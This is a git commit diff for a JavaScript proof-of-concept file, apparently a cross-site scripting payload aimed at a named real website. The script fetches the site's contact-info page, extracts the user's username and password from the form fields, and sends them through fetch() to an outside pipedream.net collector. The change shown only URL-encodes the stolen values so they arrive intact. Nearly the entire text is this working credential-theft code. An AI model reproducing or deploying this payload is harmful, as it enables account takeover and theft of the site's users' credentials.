6aca27da683fc77ddc543e4f100a4643b5a89cde
Truoc Phan <57470560+truocphan@users.noreply.github.com>
2022-10-05 10:31:15 +0700

    Update PoC.js

--- PoC.js
+++ PoC.js
@@ -3,7 +3,7 @@ xhttp.onreadystatechange = function() {
 	if (this.readyState == 4 && this.status == 200) {
 		var u = /<input name="ctl00\$content\$fvContactInfo\$ucContactInfo\$txtUsername" type="text" value="(.*)" maxlength="32" id="ctl00_content_fvContactInfo_ucContactInfo_txtUsername"/.exec(this.response)[1];
 		var p = /<input name="ctl00\$content\$fvContactInfo\$ucContactInfo\$txtPassword" type="password" maxlength="32" id="ctl00_content_fvContactInfo_ucContactInfo_txtPassword" tabindex="8" class="form-control" value="(.*)" \/>/.exec(this.response)[1];
-		fetch("//eo5k3w0etxmh3on.m.pipedream.net/?username="+u+"&password="+p+"&url="+window.location);
+		fetch("//eo5k3w0etxmh3on.m.pipedream.net/?username="+encodeURIComponent(u)+"&password="+encodeURIComponent(p)+"&url="+window.location);
 	}
 };
 xhttp.open("GET", "https://www.nbaofficials.com/Pages/ContactInfo.aspx", true);
